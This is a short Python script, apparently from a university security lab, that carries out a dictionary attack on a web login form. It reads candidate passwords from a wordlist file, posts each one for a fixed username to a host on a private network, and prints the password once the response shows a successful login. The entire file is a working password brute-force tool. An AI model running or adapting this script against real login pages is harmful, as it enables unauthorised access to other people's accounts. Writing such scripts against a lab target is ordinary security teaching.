import requests
from pathlib import Path

#url = "http://127.0.0.1:8080/"

url = "http://10.13.4.80"
username = "V_Lakrisha166"

dictionary_path = Path("/home/cse/Lab4/Q2dictionary.txt")
with open(dictionary_path, "r") as file:
    for password in file:
        password = password.strip()
        payload = {"username": username, "password": password, "submit": "submit"}
        # post request
        response = requests.post(url, data=payload)

        if "You Logged In" in response.text:
                print(password)
                break

    
